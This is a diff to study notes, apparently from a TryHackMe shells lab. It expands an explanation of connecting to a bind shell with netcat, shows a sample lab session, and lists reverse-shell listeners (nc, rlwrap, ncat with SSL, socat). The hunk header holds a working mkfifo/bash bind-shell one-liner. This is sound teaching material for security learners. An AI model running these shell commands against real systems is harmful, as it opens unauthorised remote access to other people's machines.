@@ -73,11 +73,80 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /t
 nc -nv TARGET_IP 8080
 ```
 
-- `-n` → No DNS
-- `-v` → Verbose
-- Connects to the listening bind shell
+- `nc` - This invokes Netcat, which establishes the connection to the target.
+- `-n` - Disables DNS resolution, allowing Netcat to operate faster and avoid unnecessary lookups.
+- `-v` - Verbose mode provides detailed output of the connection process, such as when the connection is established.
+- `TARGET_IP` - The IP address of the target machine where the bind shell is running.
+- `8080` - The port number on which the bind shell listens.
 
-**Result:**  
-Attacker gets an interactive shell on the target system.
+**Attacker Terminal (After Connection)**
+```shell-session
+attacker@kali:~$ nc -nv 10.10.13.37 8080 
+(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
+target@tryhackme:~$
+```
 
 ---
+
+**Shell Listeners 
+
+A **listener** waits for an incoming reverse shell connection and lets the attacker interact with it.
+
+
+
+### **Netcat (basic)**
+
+- Common, simple listener
+    
+
+`nc -lvnp 443`
+
+- No line editing or history by default.
+    
+
+---
+
+### **Rlwrap (Netcat enhancement)**
+
+- Adds **arrow keys, command history, and editing**.
+    
+
+`rlwrap nc -lvnp 443`
+
+- Wraps Netcat for better shell usability.
+    
+
+---
+
+### **Ncat (Netcat by Nmap)**
+
+- More features, including **SSL encryption**.
+    
+
+**Basic listener:**
+
+`ncat -lvnp 4444`
+
+**SSL-encrypted listener:**
+
+`ncat --ssl -lvnp 4444`
+
+- `--ssl` encrypts the reverse shell traffic.
+    
+
+---
+
+### **Socat**
+
+- Powerful tool for connecting data streams/sockets.
+    
+
+**Listener example:**
+
+`socat -d -d TCP-LISTEN:443 STDOUT`
+
+- `-d -d` → Increased verbosity
+    
+- `TCP-LISTEN:443` → Listen on port 443
+    
+- `STDOUT` → Output received data to terminal
